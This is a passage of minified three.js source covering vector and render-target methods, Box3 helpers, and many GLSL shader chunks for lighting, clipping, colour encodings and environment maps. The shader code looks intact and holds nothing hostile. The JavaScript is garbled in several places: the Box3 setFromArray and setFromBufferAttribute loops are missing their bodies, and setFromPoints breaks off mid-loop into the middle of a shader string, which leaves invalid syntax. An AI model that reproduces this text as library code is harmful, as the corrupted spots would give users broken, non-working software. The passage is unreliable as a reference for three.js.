this.divideScalar(this.length()||1)},setLength:function(a){return this.normalize().multiplyScalar(a)},lerp:function(a,b){this.x+=(a.x-this.x)*b;this.y+=(a.y-this.y)*b;this.z+=(a.z-this.z)*b;this.w+=(a.w-this.w)*b;return this},lerpVectors:function(a, b,c){return this.subVectors(b,a).multiplyScalar(c).add(a)},equals:function(a){return a.x===this.x&&a.y===this.y&&a.z===this.z&&a.w===this.w},fromArray:function(a,b){void 0===b&&(b=0);this.x=a[b];this.y=a[b+1];this.z=a[b+2];this.w=a[b+3];return this},toArray:function(a,b){void 0===a&&(a=[]);void 0===b&&(b=0);a[b]=this.x;a[b+1]=this.y;a[b+2]=this.z;a[b+3]=this.w;return a},fromBufferAttribute:function(a,b,c){void 0!==c&&console.warn(\"THREE.Vector4: offset has been removed from .fromBufferAttribute().\"); this.x=a.getX(b);this.y=a.getY(b);this.z=a.getZ(b);this.w=a.getW(b);return this}});fb.prototype=Object.assign(Object.create(ya.prototype),{constructor:fb,isWebGLRenderTarget:!0,setSize:function(a,b){if(this.width!==a||this.height!==b)this.width=a,this.height=b,this.dispose();this.viewport.set(0,0,a,b);this.scissor.set(0,0,a,b)},clone:function(){return(new this.constructor).copy(this)},copy:function(a){this.width=a.width;this.height=a.height;this.viewport.copy(a.viewport);this.texture=a.texture.clone(); this.depthBuffer=a.depthBuffer;this.stencilBuffer=a.stencilBuffer;this.depthTexture=a.depthTexture;return this},dispose:function(){this.dispatchEvent({type:\"dispose\"})}});Gb.prototype=Object.create(fb.prototype);Gb.prototype.constructor=Gb;Gb.prototype.isWebGLRenderTargetCube=!0;gb.prototype=Object.create(T.prototype);gb.prototype.constructor=gb;gb.prototype.isDataTexture=!0;Object.assign(Sa.prototype,{isBox3:!0,set:function(a,b){this.min.copy(a);this.max.copy(b);return this},setFromArray:function(a){for(var b= Infinity,c=Infinity,d=Infinity,e=-Infinity,f=-Infinity,g=-Infinity,h=0,k=a.length;he&&(e=m);q>f&&(f=q);l>g&&(g=l)}this.min.set(b,c,d);this.max.set(e,f,g);return this},setFromBufferAttribute:function(a){for(var b=Infinity,c=Infinity,d=Infinity,e=-Infinity,f=-Infinity,g=-Infinity,h=0,k=a.count;he&&(e=m);l>f&&(f=l);n>g&&(g=n)}this.min.set(b,c,d); this.max.set(e,f,g);return this},setFromPoints:function(a){this.makeEmpty();for(var b=0,c=a.length;b 0.0 ) {\\n#if defined ( PHYSICALLY_CORRECT_LIGHTS )\\n\\t\\tfloat distanceFalloff = 1.0 / max( pow( lightDistance, decayExponent ), 0.01 );\\n\\t\\tfloat maxDistanceCutoffFactor = pow2( saturate( 1.0 - pow4( lightDistance / cutoffDistance ) ) );\\n\\t\\treturn distanceFalloff * maxDistanceCutoffFactor;\\n#else\\n\\t\\treturn pow( saturate( -lightDistance / cutoffDistance + 1.0 ), decayExponent );\\n#endif\\n\\t}\\n\\treturn 1.0;\\n}\\nvec3 BRDF_Diffuse_Lambert( const in vec3 diffuseColor ) {\\n\\treturn RECIPROCAL_PI * diffuseColor;\\n}\\nvec3 F_Schlick( const in vec3 specularColor, const in float dotLH ) {\\n\\tfloat fresnel = exp2( ( -5.55473 * dotLH - 6.98316 ) * dotLH );\\n\\treturn ( 1.0 - specularColor ) * fresnel + specularColor;\\n}\\nfloat G_GGX_Smith( const in float alpha, const in float dotNL, const in float dotNV ) {\\n\\tfloat a2 = pow2( alpha );\\n\\tfloat gl = dotNL + sqrt( a2 + ( 1.0 - a2 ) * pow2( dotNL ) );\\n\\tfloat gv = dotNV + sqrt( a2 + ( 1.0 - a2 ) * pow2( dotNV ) );\\n\\treturn 1.0 / ( gl * gv );\\n}\\nfloat G_GGX_SmithCorrelated( const in float alpha, const in float dotNL, const in float dotNV ) {\\n\\tfloat a2 = pow2( alpha );\\n\\tfloat gv = dotNL * sqrt( a2 + ( 1.0 - a2 ) * pow2( dotNV ) );\\n\\tfloat gl = dotNV * sqrt( a2 + ( 1.0 - a2 ) * pow2( dotNL ) );\\n\\treturn 0.5 / max( gv + gl, EPSILON );\\n}\\nfloat D_GGX( const in float alpha, const in float dotNH ) {\\n\\tfloat a2 = pow2( alpha );\\n\\tfloat denom = pow2( dotNH ) * ( a2 - 1.0 ) + 1.0;\\n\\treturn RECIPROCAL_PI * a2 / pow2( denom );\\n}\\nvec3 BRDF_Specular_GGX( const in IncidentLight incidentLight, const in GeometricContext geometry, const in vec3 specularColor, const in float roughness ) {\\n\\tfloat alpha = pow2( roughness );\\n\\tvec3 halfDir = normalize( incidentLight.direction + geometry.viewDir );\\n\\tfloat dotNL = saturate( dot( geometry.normal, incidentLight.direction ) );\\n\\tfloat dotNV = saturate( dot( geometry.normal, geometry.viewDir ) );\\n\\tfloat dotNH = saturate( dot( geometry.normal, halfDir ) );\\n\\tfloat dotLH = saturate( dot( incidentLight.direction, halfDir ) );\\n\\tvec3 F = F_Schlick( specularColor, dotLH );\\n\\tfloat G = G_GGX_SmithCorrelated( alpha, dotNL, dotNV );\\n\\tfloat D = D_GGX( alpha, dotNH );\\n\\treturn F * ( G * D );\\n}\\nvec2 LTC_Uv( const in vec3 N, const in vec3 V, const in float roughness ) {\\n\\tconst float LUT_SIZE = 64.0;\\n\\tconst float LUT_SCALE = ( LUT_SIZE - 1.0 ) / LUT_SIZE;\\n\\tconst float LUT_BIAS = 0.5 / LUT_SIZE;\\n\\tfloat dotNV = saturate( dot( N, V ) );\\n\\tvec2 uv = vec2( roughness, sqrt( 1.0 - dotNV ) );\\n\\tuv = uv * LUT_SCALE + LUT_BIAS;\\n\\treturn uv;\\n}\\nfloat LTC_ClippedSphereFormFactor( const in vec3 f ) {\\n\\tfloat l = length( f );\\n\\treturn max( ( l * l + f.z ) / ( l + 1.0 ), 0.0 );\\n}\\nvec3 LTC_EdgeVectorFormFactor( const in vec3 v1, const in vec3 v2 ) {\\n\\tfloat x = dot( v1, v2 );\\n\\tfloat y = abs( x );\\n\\tfloat a = 0.8543985 + ( 0.4965155 + 0.0145206 * y ) * y;\\n\\tfloat b = 3.4175940 + ( 4.1616724 + y ) * y;\\n\\tfloat v = a / b;\\n\\tfloat theta_sintheta = ( x > 0.0 ) ? v : 0.5 * inversesqrt( max( 1.0 - x * x, 1e-7 ) ) - v;\\n\\treturn cross( v1, v2 ) * theta_sintheta;\\n}\\nvec3 LTC_Evaluate( const in vec3 N, const in vec3 V, const in vec3 P, const in mat3 mInv, const in vec3 rectCoords[ 4 ] ) {\\n\\tvec3 v1 = rectCoords[ 1 ] - rectCoords[ 0 ];\\n\\tvec3 v2 = rectCoords[ 3 ] - rectCoords[ 0 ];\\n\\tvec3 lightNormal = cross( v1, v2 );\\n\\tif( dot( lightNormal, P - rectCoords[ 0 ] ) < 0.0 ) return vec3( 0.0 );\\n\\tvec3 T1, T2;\\n\\tT1 = normalize( V - N * dot( V, N ) );\\n\\tT2 = - cross( N, T1 );\\n\\tmat3 mat = mInv * transposeMat3( mat3( T1, T2, N ) );\\n\\tvec3 coords[ 4 ];\\n\\tcoords[ 0 ] = mat * ( rectCoords[ 0 ] - P );\\n\\tcoords[ 1 ] = mat * ( rectCoords[ 1 ] - P );\\n\\tcoords[ 2 ] = mat * ( rectCoords[ 2 ] - P );\\n\\tcoords[ 3 ] = mat * ( rectCoords[ 3 ] - P );\\n\\tcoords[ 0 ] = normalize( coords[ 0 ] );\\n\\tcoords[ 1 ] = normalize( coords[ 1 ] );\\n\\tcoords[ 2 ] = normalize( coords[ 2 ] );\\n\\tcoords[ 3 ] = normalize( coords[ 3 ] );\\n\\tvec3 vectorFormFactor = vec3( 0.0 );\\n\\tvectorFormFactor += LTC_EdgeVectorFormFactor( coords[ 0 ], coords[ 1 ] );\\n\\tvectorFormFactor += LTC_EdgeVectorFormFactor( coords[ 1 ], coords[ 2 ] );\\n\\tvectorFormFactor += LTC_EdgeVectorFormFactor( coords[ 2 ], coords[ 3 ] );\\n\\tvectorFormFactor += LTC_EdgeVectorFormFactor( coords[ 3 ], coords[ 0 ] );\\n\\tfloat result = LTC_ClippedSphereFormFactor( vectorFormFactor );\\n\\treturn vec3( result );\\n}\\nvec3 BRDF_Specular_GGX_Environment( const in GeometricContext geometry, const in vec3 specularColor, const in float roughness ) {\\n\\tfloat dotNV = saturate( dot( geometry.normal, geometry.viewDir ) );\\n\\tconst vec4 c0 = vec4( - 1, - 0.0275, - 0.572, 0.022 );\\n\\tconst vec4 c1 = vec4( 1, 0.0425, 1.04, - 0.04 );\\n\\tvec4 r = roughness * c0 + c1;\\n\\tfloat a004 = min( r.x * r.x, exp2( - 9.28 * dotNV ) ) * r.x + r.y;\\n\\tvec2 AB = vec2( -1.04, 1.04 ) * a004 + r.zw;\\n\\treturn specularColor * AB.x + AB.y;\\n}\\nfloat G_BlinnPhong_Implicit( ) {\\n\\treturn 0.25;\\n}\\nfloat D_BlinnPhong( const in float shininess, const in float dotNH ) {\\n\\treturn RECIPROCAL_PI * ( shininess * 0.5 + 1.0 ) * pow( dotNH, shininess );\\n}\\nvec3 BRDF_Specular_BlinnPhong( const in IncidentLight incidentLight, const in GeometricContext geometry, const in vec3 specularColor, const in float shininess ) {\\n\\tvec3 halfDir = normalize( incidentLight.direction + geometry.viewDir );\\n\\tfloat dotNH = saturate( dot( geometry.normal, halfDir ) );\\n\\tfloat dotLH = saturate( dot( incidentLight.direction, halfDir ) );\\n\\tvec3 F = F_Schlick( specularColor, dotLH );\\n\\tfloat G = G_BlinnPhong_Implicit( );\\n\\tfloat D = D_BlinnPhong( shininess, dotNH );\\n\\treturn F * ( G * D );\\n}\\nfloat GGXRoughnessToBlinnExponent( const in float ggxRoughness ) {\\n\\treturn ( 2.0 / pow2( ggxRoughness + 0.0001 ) - 2.0 );\\n}\\nfloat BlinnExponentToGGXRoughness( const in float blinnExponent ) {\\n\\treturn sqrt( 2.0 / ( blinnExponent + 2.0 ) );\\n}\\n\", bumpmap_pars_fragment:\"#ifdef USE_BUMPMAP\\n\\tuniform sampler2D bumpMap;\\n\\tuniform float bumpScale;\\n\\tvec2 dHdxy_fwd() {\\n\\t\\tvec2 dSTdx = dFdx( vUv );\\n\\t\\tvec2 dSTdy = dFdy( vUv );\\n\\t\\tfloat Hll = bumpScale * texture2D( bumpMap, vUv ).x;\\n\\t\\tfloat dBx = bumpScale * texture2D( bumpMap, vUv + dSTdx ).x - Hll;\\n\\t\\tfloat dBy = bumpScale * texture2D( bumpMap, vUv + dSTdy ).x - Hll;\\n\\t\\treturn vec2( dBx, dBy );\\n\\t}\\n\\tvec3 perturbNormalArb( vec3 surf_pos, vec3 surf_norm, vec2 dHdxy ) {\\n\\t\\tvec3 vSigmaX = vec3( dFdx( surf_pos.x ), dFdx( surf_pos.y ), dFdx( surf_pos.z ) );\\n\\t\\tvec3 vSigmaY = vec3( dFdy( surf_pos.x ), dFdy( surf_pos.y ), dFdy( surf_pos.z ) );\\n\\t\\tvec3 vN = surf_norm;\\n\\t\\tvec3 R1 = cross( vSigmaY, vN );\\n\\t\\tvec3 R2 = cross( vN, vSigmaX );\\n\\t\\tfloat fDet = dot( vSigmaX, R1 );\\n\\t\\tfDet *= ( float( gl_FrontFacing ) * 2.0 - 1.0 );\\n\\t\\tvec3 vGrad = sign( fDet ) * ( dHdxy.x * R1 + dHdxy.y * R2 );\\n\\t\\treturn normalize( abs( fDet ) * surf_norm - vGrad );\\n\\t}\\n#endif\\n\", clipping_planes_fragment:\"#if NUM_CLIPPING_PLANES > 0\\n\\tvec4 plane;\\n\\t#pragma unroll_loop\\n\\tfor ( int i = 0; i < UNION_CLIPPING_PLANES; i ++ ) {\\n\\t\\tplane = clippingPlanes[ i ];\\n\\t\\tif ( dot( vViewPosition, plane.xyz ) > plane.w ) discard;\\n\\t}\\n\\t#if UNION_CLIPPING_PLANES < NUM_CLIPPING_PLANES\\n\\t\\tbool clipped = true;\\n\\t\\t#pragma unroll_loop\\n\\t\\tfor ( int i = UNION_CLIPPING_PLANES; i < NUM_CLIPPING_PLANES; i ++ ) {\\n\\t\\t\\tplane = clippingPlanes[ i ];\\n\\t\\t\\tclipped = ( dot( vViewPosition, plane.xyz ) > plane.w ) && clipped;\\n\\t\\t}\\n\\t\\tif ( clipped ) discard;\\n\\t#endif\\n#endif\\n\", clipping_planes_pars_fragment:\"#if NUM_CLIPPING_PLANES > 0\\n\\t#if ! defined( PHYSICAL ) && ! defined( PHONG )\\n\\t\\tvarying vec3 vViewPosition;\\n\\t#endif\\n\\tuniform vec4 clippingPlanes[ NUM_CLIPPING_PLANES ];\\n#endif\\n\",clipping_planes_pars_vertex:\"#if NUM_CLIPPING_PLANES > 0 && ! defined( PHYSICAL ) && ! defined( PHONG )\\n\\tvarying vec3 vViewPosition;\\n#endif\\n\",clipping_planes_vertex:\"#if NUM_CLIPPING_PLANES > 0 && ! defined( PHYSICAL ) && ! defined( PHONG )\\n\\tvViewPosition = - mvPosition.xyz;\\n#endif\\n\", color_fragment:\"#ifdef USE_COLOR\\n\\tdiffuseColor.rgb *= vColor;\\n#endif\",color_pars_fragment:\"#ifdef USE_COLOR\\n\\tvarying vec3 vColor;\\n#endif\\n\",color_pars_vertex:\"#ifdef USE_COLOR\\n\\tvarying vec3 vColor;\\n#endif\",color_vertex:\"#ifdef USE_COLOR\\n\\tvColor.xyz = color.xyz;\\n#endif\",common:\"#define PI 3.14159265359\\n#define PI2 6.28318530718\\n#define PI_HALF 1.5707963267949\\n#define RECIPROCAL_PI 0.31830988618\\n#define RECIPROCAL_PI2 0.15915494\\n#define LOG2 1.442695\\n#define EPSILON 1e-6\\n#define saturate(a) clamp( a, 0.0, 1.0 )\\n#define whiteCompliment(a) ( 1.0 - saturate( a ) )\\nfloat pow2( const in float x ) { return x*x; }\\nfloat pow3( const in float x ) { return x*x*x; }\\nfloat pow4( const in float x ) { float x2 = x*x; return x2*x2; }\\nfloat average( const in vec3 color ) { return dot( color, vec3( 0.3333 ) ); }\\nhighp float rand( const in vec2 uv ) {\\n\\tconst highp float a = 12.9898, b = 78.233, c = 43758.5453;\\n\\thighp float dt = dot( uv.xy, vec2( a,b ) ), sn = mod( dt, PI );\\n\\treturn fract(sin(sn) * c);\\n}\\nstruct IncidentLight {\\n\\tvec3 color;\\n\\tvec3 direction;\\n\\tbool visible;\\n};\\nstruct ReflectedLight {\\n\\tvec3 directDiffuse;\\n\\tvec3 directSpecular;\\n\\tvec3 indirectDiffuse;\\n\\tvec3 indirectSpecular;\\n};\\nstruct GeometricContext {\\n\\tvec3 position;\\n\\tvec3 normal;\\n\\tvec3 viewDir;\\n};\\nvec3 transformDirection( in vec3 dir, in mat4 matrix ) {\\n\\treturn normalize( ( matrix * vec4( dir, 0.0 ) ).xyz );\\n}\\nvec3 inverseTransformDirection( in vec3 dir, in mat4 matrix ) {\\n\\treturn normalize( ( vec4( dir, 0.0 ) * matrix ).xyz );\\n}\\nvec3 projectOnPlane(in vec3 point, in vec3 pointOnPlane, in vec3 planeNormal ) {\\n\\tfloat distance = dot( planeNormal, point - pointOnPlane );\\n\\treturn - distance * planeNormal + point;\\n}\\nfloat sideOfPlane( in vec3 point, in vec3 pointOnPlane, in vec3 planeNormal ) {\\n\\treturn sign( dot( point - pointOnPlane, planeNormal ) );\\n}\\nvec3 linePlaneIntersect( in vec3 pointOnLine, in vec3 lineDirection, in vec3 pointOnPlane, in vec3 planeNormal ) {\\n\\treturn lineDirection * ( dot( planeNormal, pointOnPlane - pointOnLine ) / dot( planeNormal, lineDirection ) ) + pointOnLine;\\n}\\nmat3 transposeMat3( const in mat3 m ) {\\n\\tmat3 tmp;\\n\\ttmp[ 0 ] = vec3( m[ 0 ].x, m[ 1 ].x, m[ 2 ].x );\\n\\ttmp[ 1 ] = vec3( m[ 0 ].y, m[ 1 ].y, m[ 2 ].y );\\n\\ttmp[ 2 ] = vec3( m[ 0 ].z, m[ 1 ].z, m[ 2 ].z );\\n\\treturn tmp;\\n}\\nfloat linearToRelativeLuminance( const in vec3 color ) {\\n\\tvec3 weights = vec3( 0.2126, 0.7152, 0.0722 );\\n\\treturn dot( weights, color.rgb );\\n}\\n\", cube_uv_reflection_fragment:\"#ifdef ENVMAP_TYPE_CUBE_UV\\n#define cubeUV_textureSize (1024.0)\\nint getFaceFromDirection(vec3 direction) {\\n\\tvec3 absDirection = abs(direction);\\n\\tint face = -1;\\n\\tif( absDirection.x > absDirection.z ) {\\n\\t\\tif(absDirection.x > absDirection.y )\\n\\t\\t\\tface = direction.x > 0.0 ? 0 : 3;\\n\\t\\telse\\n\\t\\t\\tface = direction.y > 0.0 ? 1 : 4;\\n\\t}\\n\\telse {\\n\\t\\tif(absDirection.z > absDirection.y )\\n\\t\\t\\tface = direction.z > 0.0 ? 2 : 5;\\n\\t\\telse\\n\\t\\t\\tface = direction.y > 0.0 ? 1 : 4;\\n\\t}\\n\\treturn face;\\n}\\n#define cubeUV_maxLods1 (log2(cubeUV_textureSize*0.25) - 1.0)\\n#define cubeUV_rangeClamp (exp2((6.0 - 1.0) * 2.0))\\nvec2 MipLevelInfo( vec3 vec, float roughnessLevel, float roughness ) {\\n\\tfloat scale = exp2(cubeUV_maxLods1 - roughnessLevel);\\n\\tfloat dxRoughness = dFdx(roughness);\\n\\tfloat dyRoughness = dFdy(roughness);\\n\\tvec3 dx = dFdx( vec * scale * dxRoughness );\\n\\tvec3 dy = dFdy( vec * scale * dyRoughness );\\n\\tfloat d = max( dot( dx, dx ), dot( dy, dy ) );\\n\\td = clamp(d, 1.0, cubeUV_rangeClamp);\\n\\tfloat mipLevel = 0.5 * log2(d);\\n\\treturn vec2(floor(mipLevel), fract(mipLevel));\\n}\\n#define cubeUV_maxLods2 (log2(cubeUV_textureSize*0.25) - 2.0)\\n#define cubeUV_rcpTextureSize (1.0 / cubeUV_textureSize)\\nvec2 getCubeUV(vec3 direction, float roughnessLevel, float mipLevel) {\\n\\tmipLevel = roughnessLevel > cubeUV_maxLods2 - 3.0 ? 0.0 : mipLevel;\\n\\tfloat a = 16.0 * cubeUV_rcpTextureSize;\\n\\tvec2 exp2_packed = exp2( vec2( roughnessLevel, mipLevel ) );\\n\\tvec2 rcp_exp2_packed = vec2( 1.0 ) / exp2_packed;\\n\\tfloat powScale = exp2_packed.x * exp2_packed.y;\\n\\tfloat scale = rcp_exp2_packed.x * rcp_exp2_packed.y * 0.25;\\n\\tfloat mipOffset = 0.75*(1.0 - rcp_exp2_packed.y) * rcp_exp2_packed.x;\\n\\tbool bRes = mipLevel == 0.0;\\n\\tscale = bRes && (scale < a) ? a : scale;\\n\\tvec3 r;\\n\\tvec2 offset;\\n\\tint face = getFaceFromDirection(direction);\\n\\tfloat rcpPowScale = 1.0 / powScale;\\n\\tif( face == 0) {\\n\\t\\tr = vec3(direction.x, -direction.z, direction.y);\\n\\t\\toffset = vec2(0.0+mipOffset,0.75 * rcpPowScale);\\n\\t\\toffset.y = bRes && (offset.y < 2.0*a) ? a : offset.y;\\n\\t}\\n\\telse if( face == 1) {\\n\\t\\tr = vec3(direction.y, direction.x, direction.z);\\n\\t\\toffset = vec2(scale+mipOffset, 0.75 * rcpPowScale);\\n\\t\\toffset.y = bRes && (offset.y < 2.0*a) ? a : offset.y;\\n\\t}\\n\\telse if( face == 2) {\\n\\t\\tr = vec3(direction.z, direction.x, direction.y);\\n\\t\\toffset = vec2(2.0*scale+mipOffset, 0.75 * rcpPowScale);\\n\\t\\toffset.y = bRes && (offset.y < 2.0*a) ? a : offset.y;\\n\\t}\\n\\telse if( face == 3) {\\n\\t\\tr = vec3(direction.x, direction.z, direction.y);\\n\\t\\toffset = vec2(0.0+mipOffset,0.5 * rcpPowScale);\\n\\t\\toffset.y = bRes && (offset.y < 2.0*a) ? 0.0 : offset.y;\\n\\t}\\n\\telse if( face == 4) {\\n\\t\\tr = vec3(direction.y, direction.x, -direction.z);\\n\\t\\toffset = vec2(scale+mipOffset, 0.5 * rcpPowScale);\\n\\t\\toffset.y = bRes && (offset.y < 2.0*a) ? 0.0 : offset.y;\\n\\t}\\n\\telse {\\n\\t\\tr = vec3(direction.z, -direction.x, direction.y);\\n\\t\\toffset = vec2(2.0*scale+mipOffset, 0.5 * rcpPowScale);\\n\\t\\toffset.y = bRes && (offset.y < 2.0*a) ? 0.0 : offset.y;\\n\\t}\\n\\tr = normalize(r);\\n\\tfloat texelOffset = 0.5 * cubeUV_rcpTextureSize;\\n\\tvec2 s = ( r.yz / abs( r.x ) + vec2( 1.0 ) ) * 0.5;\\n\\tvec2 base = offset + vec2( texelOffset );\\n\\treturn base + s * ( scale - 2.0 * texelOffset );\\n}\\n#define cubeUV_maxLods3 (log2(cubeUV_textureSize*0.25) - 3.0)\\nvec4 textureCubeUV( sampler2D envMap, vec3 reflectedDirection, float roughness ) {\\n\\tfloat roughnessVal = roughness* cubeUV_maxLods3;\\n\\tfloat r1 = floor(roughnessVal);\\n\\tfloat r2 = r1 + 1.0;\\n\\tfloat t = fract(roughnessVal);\\n\\tvec2 mipInfo = MipLevelInfo(reflectedDirection, r1, roughness);\\n\\tfloat s = mipInfo.y;\\n\\tfloat level0 = mipInfo.x;\\n\\tfloat level1 = level0 + 1.0;\\n\\tlevel1 = level1 > 5.0 ? 5.0 : level1;\\n\\tlevel0 += min( floor( s + 0.5 ), 5.0 );\\n\\tvec2 uv_10 = getCubeUV(reflectedDirection, r1, level0);\\n\\tvec4 color10 = envMapTexelToLinear(texture2D(envMap, uv_10));\\n\\tvec2 uv_20 = getCubeUV(reflectedDirection, r2, level0);\\n\\tvec4 color20 = envMapTexelToLinear(texture2D(envMap, uv_20));\\n\\tvec4 result = mix(color10, color20, t);\\n\\treturn vec4(result.rgb, 1.0);\\n}\\n#endif\\n\", defaultnormal_vertex:\"vec3 transformedNormal = normalMatrix * objectNormal;\\n#ifdef FLIP_SIDED\\n\\ttransformedNormal = - transformedNormal;\\n#endif\\n\",displacementmap_pars_vertex:\"#ifdef USE_DISPLACEMENTMAP\\n\\tuniform sampler2D displacementMap;\\n\\tuniform float displacementScale;\\n\\tuniform float displacementBias;\\n#endif\\n\",displacementmap_vertex:\"#ifdef USE_DISPLACEMENTMAP\\n\\ttransformed += normalize( objectNormal ) * ( texture2D( displacementMap, uv ).x * displacementScale + displacementBias );\\n#endif\\n\", emissivemap_fragment:\"#ifdef USE_EMISSIVEMAP\\n\\tvec4 emissiveColor = texture2D( emissiveMap, vUv );\\n\\temissiveColor.rgb = emissiveMapTexelToLinear( emissiveColor ).rgb;\\n\\ttotalEmissiveRadiance *= emissiveColor.rgb;\\n#endif\\n\",emissivemap_pars_fragment:\"#ifdef USE_EMISSIVEMAP\\n\\tuniform sampler2D emissiveMap;\\n#endif\\n\",encodings_fragment:\" gl_FragColor = linearToOutputTexel( gl_FragColor );\\n\",encodings_pars_fragment:\"\\nvec4 LinearToLinear( in vec4 value ) {\\n\\treturn value;\\n}\\nvec4 GammaToLinear( in vec4 value, in float gammaFactor ) {\\n\\treturn vec4( pow( value.xyz, vec3( gammaFactor ) ), value.w );\\n}\\nvec4 LinearToGamma( in vec4 value, in float gammaFactor ) {\\n\\treturn vec4( pow( value.xyz, vec3( 1.0 / gammaFactor ) ), value.w );\\n}\\nvec4 sRGBToLinear( in vec4 value ) {\\n\\treturn vec4( mix( pow( value.rgb * 0.9478672986 + vec3( 0.0521327014 ), vec3( 2.4 ) ), value.rgb * 0.0773993808, vec3( lessThanEqual( value.rgb, vec3( 0.04045 ) ) ) ), value.w );\\n}\\nvec4 LinearTosRGB( in vec4 value ) {\\n\\treturn vec4( mix( pow( value.rgb, vec3( 0.41666 ) ) * 1.055 - vec3( 0.055 ), value.rgb * 12.92, vec3( lessThanEqual( value.rgb, vec3( 0.0031308 ) ) ) ), value.w );\\n}\\nvec4 RGBEToLinear( in vec4 value ) {\\n\\treturn vec4( value.rgb * exp2( value.a * 255.0 - 128.0 ), 1.0 );\\n}\\nvec4 LinearToRGBE( in vec4 value ) {\\n\\tfloat maxComponent = max( max( value.r, value.g ), value.b );\\n\\tfloat fExp = clamp( ceil( log2( maxComponent ) ), -128.0, 127.0 );\\n\\treturn vec4( value.rgb / exp2( fExp ), ( fExp + 128.0 ) / 255.0 );\\n}\\nvec4 RGBMToLinear( in vec4 value, in float maxRange ) {\\n\\treturn vec4( value.xyz * value.w * maxRange, 1.0 );\\n}\\nvec4 LinearToRGBM( in vec4 value, in float maxRange ) {\\n\\tfloat maxRGB = max( value.x, max( value.g, value.b ) );\\n\\tfloat M = clamp( maxRGB / maxRange, 0.0, 1.0 );\\n\\tM = ceil( M * 255.0 ) / 255.0;\\n\\treturn vec4( value.rgb / ( M * maxRange ), M );\\n}\\nvec4 RGBDToLinear( in vec4 value, in float maxRange ) {\\n\\treturn vec4( value.rgb * ( ( maxRange / 255.0 ) / value.a ), 1.0 );\\n}\\nvec4 LinearToRGBD( in vec4 value, in float maxRange ) {\\n\\tfloat maxRGB = max( value.x, max( value.g, value.b ) );\\n\\tfloat D = max( maxRange / maxRGB, 1.0 );\\n\\tD = min( floor( D ) / 255.0, 1.0 );\\n\\treturn vec4( value.rgb * ( D * ( 255.0 / maxRange ) ), D );\\n}\\nconst mat3 cLogLuvM = mat3( 0.2209, 0.3390, 0.4184, 0.1138, 0.6780, 0.7319, 0.0102, 0.1130, 0.2969 );\\nvec4 LinearToLogLuv( in vec4 value ) {\\n\\tvec3 Xp_Y_XYZp = value.rgb * cLogLuvM;\\n\\tXp_Y_XYZp = max(Xp_Y_XYZp, vec3(1e-6, 1e-6, 1e-6));\\n\\tvec4 vResult;\\n\\tvResult.xy = Xp_Y_XYZp.xy / Xp_Y_XYZp.z;\\n\\tfloat Le = 2.0 * log2(Xp_Y_XYZp.y) + 127.0;\\n\\tvResult.w = fract(Le);\\n\\tvResult.z = (Le - (floor(vResult.w*255.0))/255.0)/255.0;\\n\\treturn vResult;\\n}\\nconst mat3 cLogLuvInverseM = mat3( 6.0014, -2.7008, -1.7996, -1.3320, 3.1029, -5.7721, 0.3008, -1.0882, 5.6268 );\\nvec4 LogLuvToLinear( in vec4 value ) {\\n\\tfloat Le = value.z * 255.0 + value.w;\\n\\tvec3 Xp_Y_XYZp;\\n\\tXp_Y_XYZp.y = exp2((Le - 127.0) / 2.0);\\n\\tXp_Y_XYZp.z = Xp_Y_XYZp.y / value.y;\\n\\tXp_Y_XYZp.x = value.x * Xp_Y_XYZp.z;\\n\\tvec3 vRGB = Xp_Y_XYZp.rgb * cLogLuvInverseM;\\n\\treturn vec4( max(vRGB, 0.0), 1.0 );\\n}\\n\", envmap_fragment:\"#ifdef USE_ENVMAP\\n\\t#if defined( USE_BUMPMAP ) || defined( USE_NORMALMAP ) || defined( PHONG )\\n\\t\\tvec3 cameraToVertex = normalize( vWorldPosition - cameraPosition );\\n\\t\\tvec3 worldNormal = inverseTransformDirection( normal, viewMatrix );\\n\\t\\t#ifdef ENVMAP_MODE_REFLECTION\\n\\t\\t\\tvec3 reflectVec = reflect( cameraToVertex, worldNormal );\\n\\t\\t#else\\n\\t\\t\\tvec3 reflectVec = refract( cameraToVertex, worldNormal, refractionRatio );\\n\\t\\t#endif\\n\\t#else\\n\\t\\tvec3 reflectVec = vReflect;\\n\\t#endif\\n\\t#ifdef ENVMAP_TYPE_CUBE\\n\\t\\tvec4 envColor = textureCube( envMap, vec3( flipEnvMap * reflectVec.x, reflectVec.yz ) );\\n\\t#elif defined( ENVMAP_TYPE_EQUIREC )\\n\\t\\tvec2 sampleUV;\\n\\t\\treflectVec = normalize( reflectVec );\\n\\t\\tsampleUV.y = asin( clamp( reflectVec.y, - 1.0, 1.0 ) ) * RECIPROCAL_PI + 0.5;\\n\\t\\tsampleUV.x = atan( reflectVec.z, reflectVec.x ) * RECIPROCAL_PI2 + 0.5;\\n\\t\\tvec4 envColor = texture2D( envMap, sampleUV );\\n\\t#elif defined( ENVMAP_TYPE_SPHERE )\\n\\t\\treflectVec = normalize( reflectVec );\\n\\t\\tvec3 reflectView = normalize( ( viewMatrix * vec4( reflectVec, 0.0 ) ).xyz + vec3( 0.0, 0.0, 1.0 ) );\\n\\t\\tvec4 envColor = texture2D( envMap, reflectView.xy * 0.5 + 0.5 );\\n\\t#else\\n\\t\\tvec4 envColor = vec4( 0.0 );\\n\\t#endif\\n\\tenvColor = envMapTexelToLinear( envColor );\\n\\t#ifdef ENVMAP_BLENDING_MULTIPLY\\n\\t\\toutgoingLight = mix( outgoingLight, outgoingLight * envColor.xyz, specularStrength * reflectivity );\\n\\t#elif defined( ENVMAP_BLENDING_MIX )\\n\\t\\toutgoingLight = mix( outgoingLight, envColor.xyz, specularStrength * reflectivity );\\n\\t#elif defined( ENVMAP_BLENDING_ADD )\\n\\t\\toutgoingLight += envColor.xyz * specularStrength * reflectivity;\\n\\t#endif\\n#endif\\n\", envmap_pars_fragment:\"#if defined( USE_ENVMAP ) || defined( PHYSICAL )\\n\\tuniform float reflectivity;\\n\\tuniform float envMapIntensity;\\n#endif\\n#ifdef USE_ENVMAP\\n\\t#if ! defined( PHYSICAL ) && ( defined( USE_BUMPMAP ) || defined( USE_NORMALMAP ) || defined( PHONG ) )\\n\\t\\tvarying vec3 vWorldPosition;\\n\\t#endif\\n\\t#ifdef ENVMAP_TYPE_CUBE\\n\\t\\tuniform samplerCube envMap;\\n\\t#else\\n\\t\\tuniform sampler2D envMap;\\n\\t#endif\\n\\tuniform float flipEnvMap;\\n\\tuniform int maxMipLevel;\\n\\t#if defined( USE_BUMPMAP ) || defined( USE_NORMALMAP ) || defined( PHONG ) || defined( PHYSICAL )\\n\\t\\tuniform float refractionRatio;\\n\\t#else\\n\\t\\tvarying vec3 vReflect;\\n\\t#endif\\n#endif\\n\", envmap_pars_vertex:\"#ifdef USE_ENVMAP\\n\\t#if defined( USE_BUMPMAP 